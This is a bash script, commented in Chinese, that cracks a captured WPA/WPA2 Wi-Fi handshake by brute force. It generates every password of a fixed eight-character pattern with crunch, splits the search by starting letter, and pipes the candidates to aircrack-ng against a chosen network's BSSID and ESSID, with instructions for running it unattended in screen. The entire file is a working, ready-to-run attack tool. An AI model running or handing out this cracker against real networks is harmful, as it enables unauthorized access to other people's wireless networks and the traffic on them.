#!/bin/bash
# 分片暴力破解 WPA/WPA2 握手包
# 格式: 6小写字母 + 1数字(第7位) + 1小写字母(第8位)
# 用法: ./crack_split.sh -b <BSSID> -e <ESSID> [起始字母] [pcap文件]
# 示例: ./crack_split.sh -b "aa:bb:cc:dd:ee:ff" -e "MyWiFi" a handshake.pcap
# 后台运行: screen -S wifi ./crack_split.sh -b ... -e ... a

PCAP="handshake.pcap"
BSSID=""
ESSID=""
START_CHAR="a"
KNOWN_DIGIT=""
KNOWN_LAST=""

usage() {
    echo "用法: $0 -b <BSSID> -e <ESSID> [-d 数字] [-l 末字母] [起始字母] [pcap文件]"
    echo "  -b  BSSID (MAC地址)"
    echo "  -e  ESSID (WiFi名称)"
    echo "  -d  已知第7位数字 (0-9，可选)"
    echo "  -l  已知末位字母 (a-z，可选)"
    echo "  起始字母  默认 a"
    echo "  pcap文件  默认 handshake.pcap"
    exit 1
}

while getopts "b:e:d:l:" opt; do
    case $opt in
        b) BSSID="$OPTARG" ;;
        e) ESSID="$OPTARG" ;;
        d) KNOWN_DIGIT="$OPTARG" ;;
        l) KNOWN_LAST="$OPTARG" ;;
        *) usage ;;
    esac
done
shift $((OPTIND-1))

if [ -n "$1" ]; then
    START_CHAR="$1"
fi
if [ -n "$2" ]; then
    PCAP="$2"
fi

if [ -z "$BSSID" ] || [ -z "$ESSID" ]; then
    echo "[!] 请指定 BSSID 和 ESSID"
    usage
fi

if [ ! -f "$PCAP" ]; then
    echo "[!] 找不到 $PCAP"
    exit 1
fi

if ! command -v crunch &> /dev/null; then
    echo "[!] 未安装 crunch，先执行: apt install crunch"
    exit 1
fi

# 构建 crunch pattern
# @ = 小写字母, % = 数字
if [ -n "$KNOWN_DIGIT" ] && [ -n "$KNOWN_LAST" ]; then
    PATTERN="@@@@@@${KNOWN_DIGIT}${KNOWN_LAST}"
    TOTAL_PER_LETTER=$((26**5))
    echo "[*] 格式: 5小写 + ${KNOWN_DIGIT}(固定) + ${KNOWN_LAST}(固定)"
elif [ -n "$KNOWN_DIGIT" ]; then
    PATTERN="@@@@@@${KNOWN_DIGIT}@"
    TOTAL_PER_LETTER=$((26**6))
    echo "[*] 格式: 6小写 + ${KNOWN_DIGIT}(固定) + 1小写"
elif [ -n "$KNOWN_LAST" ]; then
    PATTERN="@@@@@@%${KNOWN_LAST}"
    TOTAL_PER_LETTER=$((26**5 * 10))
    echo "[*] 格式: 5小写 + 1数字 + ${KNOWN_LAST}(固定)"
else
    PATTERN="@@@@@@%@"
    TOTAL_PER_LETTER=$((26**6 * 10))
    echo "[*] 格式: 6小写 + 1数字 + 1小写"
fi

echo "[*] 分片策略: 按首字母 '${START_CHAR}' 开始跑"
echo "[*] 本片组合数: 约 $TOTAL_PER_LETTER"
echo "[*] 目标: $ESSID ($BSSID)"
echo "[*] 后台运行: screen -S wifi $0 -b $BSSID -e $ESSID $START_CHAR $PCAP"
echo ""

# 计算起始和结束字符串
START_STR=""
END_STR=""
for ((i=0; i<6; i++)); do
    if [ $i -eq 0 ]; then
        START_STR="${START_STR}${START_CHAR}"
    else
        START_STR="${START_STR}a"
    fi
done
# 加上数字和末位
if [ -n "$KNOWN_DIGIT" ] && [ -n "$KNOWN_LAST" ]; then
    START_STR="${START_STR}${KNOWN_DIGIT}${KNOWN_LAST}"
elif [ -n "$KNOWN_DIGIT" ]; then
    START_STR="${START_STR}${KNOWN_DIGIT}a"
elif [ -n "$KNOWN_LAST" ]; then
    START_STR="${START_STR}0${KNOWN_LAST}"
else
    START_STR="${START_STR}0a"
fi

# 结束字符串：下一个首字母开头
END_CHAR=$(echo "$START_CHAR" | tr 'a-y' 'b-z')
if [ "$START_CHAR" = "z" ]; then
    END_STR=""
    for ((i=0; i<6; i++)); do
        END_STR="${END_STR}z"
    done
    if [ -n "$KNOWN_DIGIT" ] && [ -n "$KNOWN_LAST" ]; then
        END_STR="${END_STR}${KNOWN_DIGIT}${KNOWN_LAST}"
    elif [ -n "$KNOWN_DIGIT" ]; then
        END_STR="${END_STR}${KNOWN_DIGIT}z"
    elif [ -n "$KNOWN_LAST" ]; then
        END_STR="${END_STR}9${KNOWN_LAST}"
    else
        END_STR="${END_STR}9z"
    fi
else
    END_STR=""
    for ((i=0; i<6; i++)); do
        if [ $i -eq 0 ]; then
            END_STR="${END_STR}${END_CHAR}"
        else
            END_STR="${END_STR}a"
        fi
    done
    if [ -n "$KNOWN_DIGIT" ] && [ -n "$KNOWN_LAST" ]; then
        END_STR="${END_STR}${KNOWN_DIGIT}${KNOWN_LAST}"
    elif [ -n "$KNOWN_DIGIT" ]; then
        END_STR="${END_STR}${KNOWN_DIGIT}a"
    elif [ -n "$KNOWN_LAST" ]; then
        END_STR="${END_STR}0${KNOWN_LAST}"
    else
        END_STR="${END_STR}0a"
    fi
fi

echo "[*] 范围: $START_STR -> $END_STR"
echo "[*] 开始破解... 按 Ctrl+A 再按 D 可 detach screen"
echo ""

crunch 8 8 -t "$PATTERN" -s "$START_STR" -e "$END_STR" 2>/dev/null | \
    aircrack-ng -w - -b "$BSSID" -e "$ESSID" "$PCAP" | tee "crack_${START_CHAR}.log"

echo "[*] 本片 ($START_CHAR) 结束，检查 crack_${START_CHAR}.log 看结果"
